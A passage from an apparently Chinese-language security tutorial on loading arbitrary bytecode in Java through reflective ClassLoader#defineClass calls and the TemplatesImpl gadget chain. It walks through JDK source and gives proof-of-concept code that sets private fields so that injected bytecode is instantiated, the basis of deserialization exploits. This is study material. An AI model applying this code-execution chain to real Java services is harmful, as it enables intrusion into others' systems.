AAAGwAAAAcAAlAHABwEAAEAHQAAAAIAHg==&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">hello</span> <span class="operator">=</span> (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;Test&quot;</span>, code,<span class="number">0</span>, code.length);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ClassLoader.getSystemClassLoader()返回系统的类加载器对象</span></span><br></pre></td></tr></table></figure>

<p>如上运行后成功输出弹出计算机，就是需要注意JDK的版本问题，需要一致。</p>
<p>同样的可以直接利用IO进行文件读取，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>,String.class,<span class="type">byte</span>[].class,<span class="type">int</span>.class,<span class="type">int</span>.class);</span><br><span class="line">        method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\java_text\\java-1\\out\\production\\java-1\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">Class</span> <span class="variable">x</span> <span class="operator">=</span> (Class) method.invoke(ClassLoader.getSystemClassLoader(),<span class="string">&quot;Test&quot;</span>,code,<span class="number">0</span>,code.length);</span><br><span class="line">        x.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时要想到这里既然可以利用<code>defineClass()</code>方法直接加载字节码，那么我们在自定义类加载器的时候也要想到这一点，也许就可以直接利用。</p>
<p>在<code>defineClass</code>被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造函数，初始化代码才能被执行，而且即使我们将初始化代码放在类的static块中，在<code>defineClass</code>时也无法被直接调用到。<strong>所以，如果我们想要使用<code>defineClass</code>在目标机器上执行任意代码，需要想办法调用构造函数。</strong></p>
<p><strong>需要注意的是</strong>：由于系统的<code>ClassLoader#defineClass</code>是一个保护属性，所以我们不能直接在外部访问，必须使用反射的形式来调用。</p>
<p><strong>在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链<code>TemplateImpl</code>的基石</strong></p>
<h2 id="利用TemplatesImpl加载字节码"><a href="#利用TemplatesImpl加载字节码" class="headerlink" title="利用TemplatesImpl加载字节码"></a>利用<code>TemplatesImpl</code>加载字节码</h2><p>虽然大部分上层开发者不会直接使用到defineClass方法，但是Java底层还是有一些类用到了它，这就是<code>TemplatesImpl</code>。</p>
<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类中定义了一个内部类<code>TransletClassLoader</code>，源代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line"></span><br><span class="line">         TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">             <span class="built_in">super</span>(parent);</span><br><span class="line">            _loadedExternalExtensionFunctions = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;</span><br><span class="line">            <span class="built_in">super</span>(parent);</span><br><span class="line">            _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">            Class&lt;?&gt; ret = <span class="literal">null</span>;</span><br><span class="line">            <span class="comment">// The _loadedExternalExtensionFunctions will be empty when the</span></span><br><span class="line">            <span class="comment">// SecurityManager is not set and the FSP is turned off</span></span><br><span class="line">            <span class="keyword">if</span> (_loadedExternalExtensionFunctions != <span class="literal">null</span>) &#123;</span><br><span class="line">                ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="literal">null</span>) &#123;</span><br><span class="line">                ret = <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这个类继承自ClassLoader类，并且重写了<code>defineClass</code>方法，这里没有显示地声明其定义域，那么它的作用域就是default，可以被类外部调用。</p>
<p>从 <code>TransletClassLoader#defineClass()</code> 向前追溯一下调用链：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;</span><br><span class="line">TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line">-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>

<p>那现在来跟一下这个调用链</p>
<p>我们看<code>TemplatesImpl#defineTransletClasses()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;<span class="comment">//注意这里</span></span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>重点代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">               _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">    <span class="comment">//这里调用了defineClass()方法</span></span><br></pre></td></tr></table></figure>

<p>以及在这个<code>TemplatesImpl</code>类中的属性：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<p>这里的<code>_bytecodes</code>定义为私有的并且没有其他方法可以直接修改它，在这里可以利用反射获取并修改那个变量。</p>
<p>还需要注意，先看下面这个代码块：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里可以说明变量类型的地方</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span>  <span class="title function_">readObject</span><span class="params">(ObjectInputStream is)</span></span><br><span class="line">      <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">security</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (security != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> SecuritySupport.getSystemProperty(DESERIALIZE_TRANSLET);</span><br><span class="line">            <span class="keyword">if</span> (temp == <span class="literal">null</span> || !(temp.length()==<span class="number">0</span> || temp.equalsIgnoreCase(<span class="string">&quot;true&quot;</span>))) &#123;</span><br><span class="line">                <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.DESERIALIZE_TRANSLET_ERR);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// We have to read serialized fields first.</span></span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">gf</span> <span class="operator">=</span> is.readFields();</span><br><span class="line">        _name = (String)gf.get(<span class="string">&quot;_name&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        _bytecodes = (<span class="type">byte</span>[][])gf.get(<span class="string">&quot;_bytecodes&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        _class = (Class[])gf.get(<span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        _transletIndex = gf.get(<span class="string">&quot;_transletIndex&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        _outputProperties = (Properties)gf.get(<span class="string">&quot;_outputProperties&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        _indentNumber = gf.get(<span class="string">&quot;_indentNumber&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is.readBoolean()) &#123;</span><br><span class="line">            _uriResolver = (URIResolver) is.readObject();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _tfactory = <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//还可以结合ObjectStreamField方法，到时候可以去看看</span></span><br></pre></td></tr></table></figure>

<p><code>defineTransletClasses</code>方法中会执行一个run方法，为了防止报错所以<code>_tfactory</code>不能为空，同时从上面那个代码块中可以看出还得为<code>TransformerFactoryImpl</code>对象，现在看一下这个run方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)<span class="comment">//个人认为这里执行run的原因就是loader</span></span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br></pre></td></tr></table></figure>

<p>下面的代码就是在<code>TemplatesImple</code>类中的<code>_tfactory</code>的初值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<p>现在继续看哪里使用过这个defineTransletClasses()方法，搜索一下，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">第一个：</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">synchronized</span> Class[] getTransletClasses() &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="comment">// Falls through</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> _class;</span><br><span class="line">    &#125;</span><br><span class="line">第二个：</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getTransletIndex</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="comment">// Falls through</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> _transletIndex;</span><br><span class="line">    &#125;  </span><br><span class="line">第三个：</span><br><span class="line">    <span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">            <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">            <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet)</span><br><span class="line">                    _class[_transletIndex].getConstructor().newInstance();</span><br><span class="line">            translet.postInitialization();</span><br><span class="line">            translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">            translet.setOverrideDefaultParser(_overrideDefaultParser);</span><br><span class="line">            translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">            <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">                translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InstantiationException | IllegalAccessException |</span><br><span class="line">                NoSuchMethodException | InvocationTargetException e) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>第一个方法为私有，往上调用，没有什么方法使用过，那么就只有放弃。</p>
<p>第二个方法为public，可以直接调用，但是有限制，后面会说。</p>
<p>第三个方法向上调用发现有一个方法调用了，并且是一个public方法，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">    &#123;</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);<span class="comment">//here</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">            transformer.setURIResolver(_uriResolver);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">            transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> transformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>那么现在的思路就是实例化<code>TemplatesImpl</code>对象后直接调用它的方法就能直接使用。</p>
<p>现在来看看使用的条件是什么，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">对于第三个：</span><br><span class="line">    </span><br><span class="line">（<span class="number">1</span>）在newTransformer()方法中：</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);<span class="comment">//进入下一个方法并不需要条件继续，这里就直接诶调用get</span></span><br><span class="line"></span><br><span class="line">（<span class="number">2</span>）在 getTransletInstance()方法中：</span><br><span class="line">    <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">这里要求_name不能为<span class="literal">null</span>，_class需要为<span class="literal">null</span><span class="comment">//然后继续跟进</span></span><br><span class="line">    </span><br><span class="line">（<span class="number">3</span>）在 defineTransletClasses() 方法中</span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;<span class="comment">//_bytecodes不能为null</span></span><br><span class="line"></span><br><span class="line">        <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());<span class="comment">//_tfactory需要赋值为TransformerFactoryImpl对象</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="comment">//在这里调用了defineClass方法</span></span><br><span class="line">                <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;    </span><br></pre></td></tr></table></figure>

<p>现在来总结一下上面遇到的变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">String</span> <span class="variable">_name</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">private</span> Class[] _class = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>

<p>这里可以看到这些变量都是私有类，而且没有构造方法，所以只能用反射获取改值。所以最终可以这样构造;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Base64.getDecoder().decode(<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">mpl</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">a</span> <span class="operator">=</span> mpl.getClass();</span><br><span class="line">        setFieldValue(a,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(a,<span class="string">&quot;_bytecodes&quot;</span>,bytecodes);</span><br><span class="line">        setFieldValue(a,<span class="string">&quot;_class&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(a,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        mpl.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Class a,String name,Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> a.getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(a,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是现在又遇到一个问题，这里并不能直接利用构造函数，即没有初始化，这样并不能利用我们自己构造的代码，那么该如何解决，继续看代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">看getTransletInstance()方法：</span><br><span class="line">    <span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">        <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">            <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">            <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet)</span><br><span class="line">                    _class[_transletIndex].getConstructor().newInstance();<span class="comment">//这里实例化了一个对象</span></span><br><span class="line">            translet.postInitialization();</span><br><span class="line">            translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">            translet.setOverrideDefaultParser(_overrideDefaultParser);</span><br><span class="line">            translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">            <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">                translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br></pre></td></tr></table></figure>

<p>可以看到代码后半部分实例化了一个对象给translet，并且最后返回的也是translet，所以还是这里的<code>newInstance()</code>有用，所以要确保进入<code>defineTransletClasses()</code>并不会报错，现在继续来看<code>defineTransletClasses()</code>方法</p>
